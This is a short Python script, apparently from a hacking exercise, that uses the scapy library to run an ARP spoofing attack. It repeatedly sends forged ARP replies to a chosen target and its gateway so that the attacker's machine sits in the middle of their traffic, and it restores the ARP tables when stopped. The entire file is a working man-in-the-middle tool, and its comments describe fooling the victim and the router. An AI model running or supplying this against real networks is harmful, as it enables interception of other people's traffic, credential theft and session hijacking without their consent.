#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP/ IP range")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
    options = parser.parse_args()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # creating a  network frame
    arp_request_broadcast = broadcast/arp_request   # creating a new packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # send the packet and return the response
    return(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # packet to fool the target that this  machine is the router
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# main function
options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target_ip,options.gateway_ip)  # function call to fool the victim
        spoof(options.gateway_ip,options.target_ip)  # function call to fool the router
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sent_packets_count = sent_packets_count+2
        time.sleep(2)  # time gap of 2 seconds
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
    restore(options.target_ip,options.gateway_ip)  # restoring default ARP address in target machine
    restore(options.gateway_ip,options.target_ip)  # restoring default ARP address in router